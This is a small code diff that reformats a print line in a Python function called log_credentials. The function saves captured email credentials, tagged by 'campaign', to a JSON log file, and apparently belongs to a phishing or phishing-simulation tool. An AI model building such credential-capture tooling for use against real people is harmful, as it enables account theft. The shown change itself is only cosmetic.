@@ -240,7 +240,7 @@ def log_credentials(data):
         with open(CAPTURED_LOG_FILE, "w", encoding="utf-8") as file:
             json.dump(logs, file, indent=4)
 
-        print(f"✅ Credentials logged: {data['email']} | {data['campaign']}")
+        print(f"✅ Credentials logged: user={data['email']} | campaign={data['campaign']}")
     except Exception as e:
         print(f"❌ Error logging credentials: {e}")
 
